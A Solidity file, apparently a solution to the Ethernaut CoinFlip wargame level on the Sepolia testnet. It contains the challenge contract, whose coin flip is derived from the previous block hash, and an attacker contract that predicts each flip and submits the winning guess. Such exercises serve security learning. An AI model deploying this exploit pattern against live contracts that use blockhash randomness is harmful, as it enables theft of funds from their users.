// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.7;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

//Subimtted Tx: https://sepolia.etherscan.io/tx/0xb0e2623a3a33aafdfa79a8dd203948c1affdabce5a40ce14c2528f1ae55c6865 

interface IRandomNumber {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}

contract CoinFlipAttacker {
    using SafeMath for uint256;

    IRandomNumber public immutable randomNum;
    uint256 public constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address contractAddr) {
        randomNum = IRandomNumber(contractAddr);
    }

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number.sub(1))); 

        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        randomNum.flip(side);
    }
}